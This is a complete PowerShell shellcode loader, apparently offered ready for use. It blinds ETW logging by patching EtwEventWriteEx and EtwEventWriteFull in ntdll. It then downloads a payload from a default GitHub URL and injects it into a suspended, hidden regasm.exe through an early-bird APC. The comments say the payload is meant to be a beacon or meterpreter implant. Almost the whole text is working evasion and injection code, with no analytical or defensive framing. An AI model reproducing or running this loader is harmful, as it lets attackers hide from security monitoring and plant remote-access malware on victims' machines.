#Requires -Version 5.1
<#
    loader.ps1  —  raw shellcode -> suspended regasm.exe (PE32) -> early-bird APC

    default:   powershell -ExecutionPolicy Bypass -File .\loader.ps1
    override:  powershell -ExecutionPolicy Bypass -File .\loader.ps1 -Url http://host/sc.bin -Wait 0

    Flow: ETW silencing -> download raw shellcode -> spawn Framework\v4.0.30319\regasm.exe
          (x86) suspended -> VirtualAllocEx/WriteProcessMemory/VirtualProtectEx ->
          QueueUserAPC + ResumeThread -> liveness watch -> report.

    Notes
      * regasm from Framework (not Framework64) is PE32, so this runs 32-bit and relaunches
        itself under SysWOW64 powershell when started x64.
      * EtwEventWrite is not touched: an early return from it trips a CLR fail-fast
        (0xC0000409). EtwEventWriteEx / EtwEventWriteFull are hooked and restored before exit.
      * The payload must block (beacon / meterpreter). If it returns, regasm prints its usage
        and exits, taking the injected thread with it.
#>
[CmdletBinding()]
param(
    [string]$Url = 'https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin',
    [int]$Wait = 10
)

$ErrorActionPreference = 'Stop'

function Say([string]$Tag, [string]$Msg) {
    Write-Host ('[{0}] {1,-6} {2}' -f (Get-Date).ToString('HH:mm:ss.fff'), $Tag, $Msg)
}

# ---------------------------------------------------------------- 32-bit host

if ([IntPtr]::Size -eq 8) {
    $x86 = Join-Path $env:WINDIR 'SysWOW64\WindowsPowerShell\v1.0\powershell.exe'
    if (-not $PSCommandPath) { Say 'arch' 'start with -File so the loader can relaunch itself'; exit 2 }
    Say 'arch' 'x64 host -> relaunching under SysWOW64 powershell'
    $line = '-NoProfile -ExecutionPolicy Bypass -File "{0}" -Url "{1}" -Wait {2}' -f $PSCommandPath, $Url, $Wait
    # -NoNewWindow keeps the trace visible. WaitForExit waits for the loader only — Start-Process
    # -Wait would also wait for the injected regasm process, which is supposed to stay alive.
    $p = Start-Process -FilePath $x86 -ArgumentList $line -NoNewWindow -PassThru
    $p.WaitForExit()
    exit $p.ExitCode
}

Say 'host' ('powershell {0} x86 pid={1}' -f $PSVersionTable.PSVersion, $PID)

# ---------------------------------------------------------------- interop

Add-Type -TypeDefinition @'
using System;
using System.Text;
using System.Runtime.InteropServices;

public static class N
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct SI
    {
        public int cb; public string r; public string d; public string t;
        public int x, y, xs, ys, xc, yc, fa, flags;
        public short w, c2; public IntPtr r2; public IntPtr i, o, e;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PI { public IntPtr hProcess; public IntPtr hThread; public int pid; public int tid; }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessW(string app, StringBuilder cmd, IntPtr pa, IntPtr ta,
        bool inherit, uint flags, IntPtr env, string cwd, ref SI si, out PI pi);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hp, IntPtr addr, UIntPtr size, uint type, uint prot);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hp, IntPtr addr, byte[] buf, UIntPtr size, out UIntPtr done);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hp, IntPtr addr, UIntPtr size, uint prot, out uint old);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool FlushInstructionCache(IntPtr hp, IntPtr addr, UIntPtr size);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint QueueUserAPC(IntPtr fn, IntPtr hThread, IntPtr data);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr h, uint ms);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetExitCodeProcess(IntPtr h, out uint code);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr h);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetModuleHandle(string name);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr m, string name);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint prot, out uint old);

    // ---- ETW ----

    static IntPtr[] eAddr = new IntPtr[2];
    static byte[] eByte = new byte[2];
    static int eCount = 0;

    public static string Etw()
    {
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        string[] names = new string[] { "EtwEventWriteEx", "EtwEventWriteFull" };
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < names.Length; i++)
        {
            IntPtr f = GetProcAddress(ntdll, names[i]);
            if (f == IntPtr.Zero) { sb.Append(names[i] + "=missing "); continue; }
            uint old;
            if (!VirtualProtect(f, (UIntPtr)1, 0x40, out old)) { sb.Append(names[i] + "=deny "); continue; }
            eAddr[eCount] = f;
            eByte[eCount] = Marshal.ReadByte(f);
            eCount++;
            Marshal.WriteByte(f, 0xC3);
            VirtualProtect(f, (UIntPtr)1, old, out old);
            sb.Append(names[i] + "=ok ");
        }
        return sb.ToString().Trim();
    }

    public static void EtwRestore()
    {
        for (int i = 0; i < eCount; i++)
        {
            uint old;
            if (!VirtualProtect(eAddr[i], (UIntPtr)1, 0x40, out old)) continue;
            Marshal.WriteByte(eAddr[i], eByte[i]);
            VirtualProtect(eAddr[i], (UIntPtr)1, old, out old);
        }
        eCount = 0;
    }

    // ---- process ----

    public static PI Spawn(string exe, string args)
    {
        SI si = new SI();
        si.cb = Marshal.SizeOf(typeof(SI));
        si.flags = 0x1;   // STARTF_USESHOWWINDOW
        si.w = 0;         // SW_HIDE
        PI pi;
        StringBuilder cmd = new StringBuilder("\"" + exe + "\" " + args);

        // CREATE_SUSPENDED | CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB
        if (!CreateProcessW(null, cmd, IntPtr.Zero, IntPtr.Zero, false, 0x4 | 0x08000000 | 0x01000000,
                IntPtr.Zero, null, ref si, out pi))
        {
            // job without breakaway
            if (!CreateProcessW(null, cmd, IntPtr.Zero, IntPtr.Zero, false, 0x4 | 0x08000000,
                    IntPtr.Zero, null, ref si, out pi))
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
        }
        return pi;
    }

    public static IntPtr Inject(IntPtr hp, IntPtr ht, byte[] sc)
    {
        IntPtr remote = VirtualAllocEx(hp, IntPtr.Zero, (UIntPtr)sc.Length, 0x3000, 0x04); // commit|reserve, RW
        if (remote == IntPtr.Zero) throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());

        UIntPtr done;
        if (!WriteProcessMemory(hp, remote, sc, (UIntPtr)sc.Length, out done) || done.ToUInt32() != (uint)sc.Length)
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());

        uint old;
        if (!VirtualProtectEx(hp, remote, (UIntPtr)sc.Length, 0x20, out old))  // RW -> RX
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());

        FlushInstructionCache(hp, remote, (UIntPtr)sc.Length);

        if (QueueUserAPC(remote, ht, IntPtr.Zero) == 0)
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());

        ResumeThread(ht);
        return remote;
    }

    public static bool Alive(IntPtr h, int ms) { return WaitForSingleObject(h, (uint)ms) != 0; }

    public static long ExitCode(IntPtr h)
    {
        uint c;
        if (!GetExitCodeProcess(h, out c)) return -1;
        return (long)c;
    }

    public static void Close(IntPtr h) { if (h != IntPtr.Zero) CloseHandle(h); }
}
'@

Say 'etw' ([N]::Etw())

$pi = [N]::PI
$remote = [IntPtr]::Zero

try {
    # ---------------------------------------------------------------- payload

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $sw = [Diagnostics.Stopwatch]::StartNew()
    $req = [Net.HttpWebRequest]::Create($Url)
    $req.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
    $req.Timeout = 20000
    $req.ReadWriteTimeout = 20000
    $req.AllowAutoRedirect = $true
    $resp = $req.GetResponse()
    $ms = New-Object IO.MemoryStream
    $resp.GetResponseStream().CopyTo($ms)
    $resp.Close()
    $sw.Stop()
    $sc = $ms.ToArray()
    if ($sc.Length -lt 1) { throw 'empty payload' }
    Say 'net' ('{0} bytes in {1} ms' -f $sc.Length, $sw.ElapsedMilliseconds)

    # ---------------------------------------------------------------- target

    $regasm = Join-Path $env:WINDIR 'Microsoft.NET\Framework\v4.0.30319\regasm.exe'
    if (-not (Test-Path -LiteralPath $regasm)) { Say 'target' 'regasm.exe not found'; exit 2 }

    $fs = [IO.File]::Open($regasm, 'Open', 'Read', 'ReadWrite')
    try {
        $br = New-Object IO.BinaryReader($fs)
        $mz = $br.ReadUInt16()
        $fs.Position = 0x3C
        $lf = $br.ReadInt32()
        $fs.Position = $lf
        $pe = $br.ReadUInt32()
        $machine = $br.ReadUInt16()
    } finally { $fs.Close() }

    if ($mz -ne 0x5A4D -or $pe -ne 0x4550 -or $machine -ne 0x14C) {
        Say 'target' ('not PE32/x86 (0x{0:X4})' -f $machine); exit 2
    }
    Say 'target' 'regasm.exe x86'

    # ---------------------------------------------------------------- spawn + inject

    $pi = [N]::Spawn($regasm, '/nologo')
    Say 'spawn' ('pid={0} suspended' -f $pi.pid)

    $remote = [N]::Inject($pi.hProcess, $pi.hThread, $sc)
    Say 'inject' ('{0} bytes at 0x{1:X} rw->rx, apc queued, resumed' -f $sc.Length, $remote.ToInt64())

    # ---------------------------------------------------------------- watch

    $t0 = Get-Date
    $alive = $true
    while (((Get-Date) - $t0).TotalSeconds -lt $Wait) {
        if (-not [N]::Alive($pi.hProcess, 250)) { $alive = $false; break }
    }
    $secs = [Math]::Round(((Get-Date) - $t0).TotalSeconds, 2)
    if ($alive) {
        Say 'watch' ('alive at {0}s - payload is running' -f $secs)
    } else {
        Say 'watch' ('exited code=0x{0:X} after {1}s - payload returned or crash' -f [N]::ExitCode($pi.hProcess), $secs)
    }
} catch {
    Say 'error' $_.Exception.Message
    exit 5
} finally {
    [N]::Close($pi.hThread)
    [N]::Close($pi.hProcess)
    [N]::EtwRestore()
}

Say 'done' 'exit 0'
exit 0
